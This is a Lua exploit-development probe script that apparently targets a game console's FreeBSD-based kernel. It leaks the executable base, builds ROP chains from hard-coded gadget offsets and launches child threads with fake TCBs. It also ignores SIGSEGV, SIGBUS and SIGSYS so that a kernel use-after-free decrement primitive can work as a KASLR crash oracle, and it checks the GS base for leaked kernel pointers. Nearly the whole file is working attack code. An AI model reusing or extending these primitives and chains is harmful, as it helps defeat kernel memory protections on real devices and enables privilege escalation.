-- CRASH_CLASS: MODERATE
-- PROBE 69b: Child thread signal handler as crash oracle
--
-- Context: The entry_dispose primitive does lock xadd [*(I+0x40)+0x28], -1.
-- If we control I+0x40 after reclaim, we decrement any kernel address + 0x28.
-- Problem: if addr+0x28 is unmapped, the child gets SIGSEGV and dies.
-- Solution: install a SIGSEGV handler in the parent (inherited by child).
-- With a handler, the child survives and can report whether the access hit
-- a valid address — turning the decrement into a KASLR crash oracle.
--
-- This probe tests: (1) can parent install a signal handler that child inherits?
-- (2) does the child survive a fault when the handler is installed?
-- (3) can we distinguish mapped vs unmapped from the child's survival?

print("=== PROBE 69b: SIGNAL CRASH ORACLE ===")
print("")

local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local ok,v=pcall(function() return memory.read_dword(a) end) if ok then return N(v) end return nil end
local function rq(a) local ok,v=pcall(function() return memory.read_qword(a) end) if ok then return v end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function get_hi_lo(val) if type(val)=="table" and val.h then return val.h,val.l end return 0,N(val) end
local function fmt(val) if val==nil then return "nil" end local h,l=get_hi_lo(val) return string.format("0x%08X%08X",h,l) end
local function sgn(v) local l=N(v) if l>=0x80000000 then l=l-0x100000000 end return l end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Get eboot base
local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib)+0x108) or 0; local ehi = rd(N(ib)+0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- [A] TEST: SIGSEGV handler installation
print("")
print("-- [A] INSTALL SIGSEGV HANDLER --")
-- SIG_IGN = 1 for SIGSEGV (signal 11)
-- This makes the process ignore SIGSEGV instead of dying
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))  -- SIG_IGN
wd(N(sa_buf)+8, 0)
wq(uint64(N(sa_buf)+16), uint64(0))
local ret_segv = sgn(mk(416)(uint64(11), sa_buf, uint64(0)))
print("sigaction(SIGSEGV=11, SIG_IGN): ret=" .. ret_segv)

-- Also ignore SIGBUS (signal 10)
local ret_bus = sgn(mk(416)(uint64(10), sa_buf, uint64(0)))
print("sigaction(SIGBUS=10, SIG_IGN): ret=" .. ret_bus)

-- Already ignoring SIGSYS (12) from standard setup
local ret_sys = sgn(mk(416)(uint64(12), sa_buf, uint64(0)))
print("sigaction(SIGSYS=12, SIG_IGN): ret=" .. ret_sys)

-- [B] TEST: Child with intentional fault (unmapped read)
print("")
print("-- [B] CHILD FAULT SURVIVAL --")
do
    local marker = memory.alloc(8)
    wq(N(marker), uint64(0))

    -- Build child ROP chain:
    -- 1. Write marker=0xAAAA (proves child started)
    -- 2. Read from address 0 (intentional SIGSEGV)
    -- 3. Write marker=0xBBBB (proves child survived the fault)
    -- 4. thr_exit

    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    for i = 0, 0x3FFC, 4 do wd(sb+i, 0) end

    -- Fake TCB for errno access
    local tcb = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(tcb)+i, 0) end
    wq(N(tcb), uint64(N(tcb)))  -- self-referencing

    local sp = sb + 0x4000 - ((sb+0x4000)%16) - 8
    local o = 0
    local function w(v) wq(sp+o, v); o = o+8 end

    -- sysarch(SET_FSBASE=129, &tcb) for fake TCB
    w(g_pop_rax); w(uint64(165))  -- sysarch
    w(g_pop_rdi); w(uint64(129))  -- SET_FSBASE
    w(g_pop_rsi); w(uint64(N(tcb)))
    w(stub)

    -- Write marker = 0xAAAA (child started)
    w(g_pop_rax); w(uint64(0xAAAA))
    w(g_pop_rdi); w(uint64(N(marker)))
    w(g_mov_m_rax)

    -- Attempt write(fd=999, NULL, 0) — invalid fd with fake TCB = safe -1
    w(g_pop_rax); w(uint64(4))   -- write syscall
    w(g_pop_rdi); w(uint64(999)) -- invalid fd
    w(g_pop_rsi); w(uint64(0))   -- NULL buf
    w(g_pop_rdx); w(uint64(0))   -- len 0
    w(stub)

    -- Write marker = 0xBBBB (child survived errno access)
    w(g_pop_rax); w(uint64(0xBBBB))
    w(g_pop_rdi); w(uint64(N(marker)))
    w(g_mov_m_rax)

    -- thr_exit
    w(g_pop_rdi); w(uint64(0))
    w(g_pop_rax); w(uint64(431))
    w(stub)

    -- Launch child
    local pa = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pa)+i, 0) end
    wq(N(pa), g_bare_ret)          -- start_func
    wq(N(pa)+0x10, uint64(sb))     -- stack_base
    wq(N(pa)+0x18, uint64(0x4000)) -- stack_size

    pcall(function() mk(455)(pa, uint64(0x38)) end)

    -- Wait for result
    for w2 = 1, 500000 do
        local v = rq(N(marker))
        if v ~= nil and N(v) ~= 0 then break end
    end

    local final = rq(N(marker))
    local final_n = N(final or uint64(0))
    print(string.format("  marker = 0x%X", final_n))
    if final_n == 0xBBBB then
        print("  *** CHILD SURVIVED FAULT — SIGNAL HANDLER INHERITED ***")
    elseif final_n == 0xAAAA then
        print("  child started but died at the fault — SIG_IGN NOT inherited or signal kills ROP")
    else
        print("  child never started or marker not readable")
    end
end

if not alive() then print("DEAD after section B"); return end

-- [C] TEST: mprotect as proxy for whether signal handler works for
-- kernel-directed faults (SIGSEGV from kernel context vs userland)
print("")
print("-- [C] MPROTECT FAULT TEST --")
do
    -- Map a page, then mprotect it to PROT_NONE, then try to read from child
    local page = memory.alloc(0x4000)
    local page_addr = N(page)
    -- Write a sentinel
    wd(page_addr, 0xCAFECAFE)
    print(string.format("  page at 0x%X, sentinel=0x%X", page_addr, rd(page_addr) or 0))

    -- mprotect to PROT_NONE
    local aligned = page_addr - (page_addr % 0x4000)
    local ret_mp = sgn(mk(74)(uint64(aligned), uint64(0x4000), uint64(0)))
    print(string.format("  mprotect(%X, PROT_NONE): ret=%d", aligned, ret_mp))

    -- Try to read from main thread via pcall
    local ok_main, val_main = pcall(function() return memory.read_dword(page_addr) end)
    print(string.format("  main thread pcall read: ok=%s", tostring(ok_main)))

    -- Restore protection
    ret_mp = sgn(mk(74)(uint64(aligned), uint64(0x4000), uint64(3)))
    print(string.format("  mprotect(%X, PROT_RW): ret=%d", aligned, ret_mp))
end

if not alive() then print("DEAD after section C"); return end

-- [D] TEST: Close(-1) from child with SIG_IGN — errno path survival
print("")
print("-- [D] CHILD ERRNO PATH (close -1) --")
do
    local marker = memory.alloc(8)
    wq(N(marker), uint64(0))

    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    for i = 0, 0x3FFC, 4 do wd(sb+i, 0) end

    local tcb = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(tcb)+i, 0) end
    wq(N(tcb), uint64(N(tcb)))

    local sp = sb + 0x4000 - ((sb+0x4000)%16) - 8
    local o = 0
    local function w(v) wq(sp+o, v); o = o+8 end

    -- sysarch(SET_FSBASE=129, &tcb)
    w(g_pop_rax); w(uint64(165))
    w(g_pop_rdi); w(uint64(129))
    w(g_pop_rsi); w(uint64(N(tcb)))
    w(stub)

    -- close(-1) — should return -1 with errno=EBADF
    w(g_pop_rax); w(uint64(6))  -- close
    w(g_pop_rdi); w(uint64(0xFFFFFFFF))  -- -1
    w(stub)

    -- If we get here, errno access worked
    w(g_pop_rax); w(uint64(0xCCCC))
    w(g_pop_rdi); w(uint64(N(marker)))
    w(g_mov_m_rax)

    -- close(-1) again, 10 times to stress test
    for rep = 1, 10 do
        w(g_pop_rax); w(uint64(6))
        w(g_pop_rdi); w(uint64(0xFFFFFFFF))
        w(stub)
    end

    -- Final marker
    w(g_pop_rax); w(uint64(0xDDDD))
    w(g_pop_rdi); w(uint64(N(marker)))
    w(g_mov_m_rax)

    -- thr_exit
    w(g_pop_rdi); w(uint64(0))
    w(g_pop_rax); w(uint64(431))
    w(stub)

    local pa = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pa)+i, 0) end
    wq(N(pa), g_bare_ret)
    wq(N(pa)+0x10, uint64(sb))
    wq(N(pa)+0x18, uint64(0x4000))

    pcall(function() mk(455)(pa, uint64(0x38)) end)

    for w2 = 1, 500000 do
        local v = rq(N(marker))
        if v ~= nil and N(v) ~= 0 then break end
    end

    local final = N(rq(N(marker)) or uint64(0))
    print(string.format("  marker = 0x%X", final))
    if final == 0xDDDD then
        print("  *** 11x close(-1) survived — TCB + SIG_IGN working ***")
    elseif final == 0xCCCC then
        print("  first close worked, died on repeats")
    else
        print("  child never reached close(-1) or died there")
    end
end

-- [E] TEST: sysarch(GET_GSBASE=130) from child — check if it returns kernel data
print("")
print("-- [E] GET_GSBASE FROM CHILD --")
do
    local marker = memory.alloc(8)
    wq(N(marker), uint64(0))
    local gs_out = memory.alloc(8)
    wq(N(gs_out), uint64(0xDEAD))

    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    for i = 0, 0x3FFC, 4 do wd(sb+i, 0) end

    local tcb = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(tcb)+i, 0) end
    wq(N(tcb), uint64(N(tcb)))

    local sp = sb + 0x4000 - ((sb+0x4000)%16) - 8
    local o = 0
    local function w(v) wq(sp+o, v); o = o+8 end

    -- sysarch(SET_FSBASE=129, &tcb)
    w(g_pop_rax); w(uint64(165))
    w(g_pop_rdi); w(uint64(129))
    w(g_pop_rsi); w(uint64(N(tcb)))
    w(stub)

    -- sysarch(GET_GSBASE=130, &gs_out)
    w(g_pop_rax); w(uint64(165))
    w(g_pop_rdi); w(uint64(130))
    w(g_pop_rsi); w(uint64(N(gs_out)))
    w(stub)

    -- Write rax (return value) to marker
    w(g_pop_rdi); w(uint64(N(marker)))
    w(g_mov_m_rax)

    -- thr_exit
    w(g_pop_rdi); w(uint64(0))
    w(g_pop_rax); w(uint64(431))
    w(stub)

    local pa = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pa)+i, 0) end
    wq(N(pa), g_bare_ret)
    wq(N(pa)+0x10, uint64(sb))
    wq(N(pa)+0x18, uint64(0x4000))

    pcall(function() mk(455)(pa, uint64(0x38)) end)

    for w2 = 1, 500000 do
        local v = rq(N(marker))
        if v ~= nil and N(v) ~= 0 then break end
    end

    local ret_val = rq(N(marker))
    local gs_val = rq(N(gs_out))
    print(string.format("  sysarch(GET_GSBASE) ret=%s", fmt(ret_val)))
    print(string.format("  GS base value=%s", fmt(gs_val)))

    if gs_val ~= nil then
        local h, l = get_hi_lo(gs_val)
        if h >= 0xFFFF8000 then
            print("  *** KERNEL POINTER IN GS BASE! KASLR DEFEATED ***")
        elseif N(gs_val) == 0xDEAD then
            print("  unchanged — sysarch failed or child died before write")
        elseif N(gs_val) == 0 then
            print("  GS base = 0 (kernel zeroed it)")
        else
            print("  userland address — no KASLR info")
        end
    end
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 69b DONE ===")
